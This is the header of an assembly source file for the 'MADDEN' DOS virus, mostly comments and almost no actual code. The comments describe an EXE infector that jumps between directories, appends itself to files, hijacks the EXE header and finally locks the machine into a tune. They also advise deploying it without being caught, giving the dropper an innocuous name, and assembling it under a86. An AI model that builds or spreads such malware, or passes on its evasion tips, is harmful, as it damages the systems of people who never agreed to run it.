;The MADDEN virus is an EXE file infector which can jump from directory to
;directory.   It attaches itself to the end of a file and
;modifies the EXE file header so that it gets control first, before the host
;program. When it is done doing its job, it passes control to the host program,
;so that the host executes without a hint that the virus is there.


	.SEQ                       ;segments must appear in sequential order
				   ;to simulate conditions in actual active virus


;MGROUP  GROUP   HOSTSEG,HSTACK     ;Host stack and code segments grouped together

;HOSTSEG program code segment. The virus gains control before this routine and
;attaches itself to another EXE file. As such, the host program for this
;installer simply tries to delete itself off of disk and terminates. That is
;worthwhile if you want to infect a system with the virus without getting
;caught. Just execute the program that infects, and it disappears without a
;trace. You might want to name the program something more innocuous, though.
;MADDEN also locks the pc into a 'maddening' toon when it runs out
;of files to infect. (MADDEN can be assembled to an .obj file under a86,
;then linked to the 'infected' .exe form.)
